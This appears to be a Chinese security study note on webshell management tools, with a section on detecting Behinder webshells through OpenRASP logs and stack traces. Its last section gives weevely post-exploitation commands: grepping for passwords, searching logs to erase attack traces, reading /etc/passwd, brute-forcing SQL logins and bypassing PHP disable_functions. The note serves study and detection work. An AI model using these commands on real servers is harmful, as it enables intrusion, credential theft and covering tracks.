### Webshell管理与后渗透工具

|名称|管理端的编程语言|针对目标环境|描述|
|:-------------:|--|--|-----|
|[epinna/weevely3](https://github.com/epinna/weevely3)|python|php|文件管理/HTTP(S) proxy/Bruteforce SQL accounts/Port scan|
|[rebeyond/Behinder](https://github.com/rebeyond/Behinder)|Java|php/Java/.NET|“冰蝎” 动态二进制加密 webshell管理端|
|[ABPTTS](https://github.com/nccgroup/ABPTTS)|python|.jsp .war .aspx|TCP tunneling over HTTP/HTTPS for web application servers. 参考[Black Hat USA 2016](https://www.blackhat.com/us-16/arsenal.html#a-black-path-toward-the-sun) |

### 通过堆栈检测未知webshell(可发现冰蝎webshell)

冰蝎webshell的JSP版本通过自定义ClassLoader + defineClass方法来实现eval特性。
```
new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);
```

因为流量是AES双向加密的，可绕过WAF和IDS。

但部署在应用内部的OpenRASP，能够看到后门操作（安装 999-event-logger 插件即可看到日志）:
```
[event-logger] Listing directory content: /
[event-logger] Execute command: whoami
```

同样，可通过"命令执行"的堆栈进行检测:
```
java.lang.ProcessBuilder.start
...
net.rebeyond.behinder.payload.java.Cmd.RunCMD
net.rebeyond.behinder.payload.java.Cmd.equals
```

检测方法参考自[百度安全实验室](https://mp.weixin.qq.com/s?src=11&timestamp=1562667020&ver=1718&signature=d-uJaXrL7n3rxgaAIbCwhNwsmR30j*WEc-6KntSfDK53VoJSUODDlwvvxEiF3Y5oN*8PnkZChi5DtxhyhtULFDryXwj927jCv1H2KWYADcTU-VHxlZas6QlTRVxkSkoP&new=1)


#### 后渗透功能

weevely的后渗透功能：
* 信息搜集
    * 使用grep提取各文件中的敏感信息
      * 口令
        * `grep . '^[^*/#]*passw?o?r?d?'`
      * 连接数据库的代码
        * `grep . 'mysql_conn'`
      * 日志 搜索敏感ip以便后续清除攻击痕迹
        * `grep . '209.12.12.12'`
    * SQL交互模式
      * 使用sql_console模块 - 连接mysql 并进入交互模式
        * `sql_console -user USER -passwd PASS123 -host 10.2.3.4` 然后可以使用`show databases;`等进行命令交互。
    * 读取敏感文件
      * 使用audit_etcpasswd模块 - 用不同技术读取passwd文件
        * `:audit_etcpasswd`
    * 暴力枚举登录口令
      * 使用bruteforce_sql模块 - 暴力枚举SQL用户的登录口令
        * `:bruteforce_sql mysql -users USERNAME1 USERNAME2 USERNAME3ROOT -fpwds wordlists/dic.txt`
    * 命令交互
      * 使用audit_disablefunctionbypass模块 - 伪终端命令交互
        * 适用环境:php的配置文件`php.ini`中`disable_functions=`说明了禁止执行的php函数，如`exec()`等
        * 启动模块`:audit_disablefunctionbypass` 注意：会上传2个文件 `.htaccess` 和 CGI脚本 `acubu.ved`
        * 通过CGI脚本启动的独立进程`acubu.ved` 即可实现伪终端 进行命令交互 如`ps -aux` `whoami` 等
        * 不需要执行命令则可删除之前上传的2个文件 `:file_rm .htaccess` `:file_rm acubu.ved`
        * 如果不删除之前上传的2个文件 则下次可以直接启动CGI脚本 启动伪终端 `:audit_disablefunctionbypass -just-run http://localhost/acubu.ved`
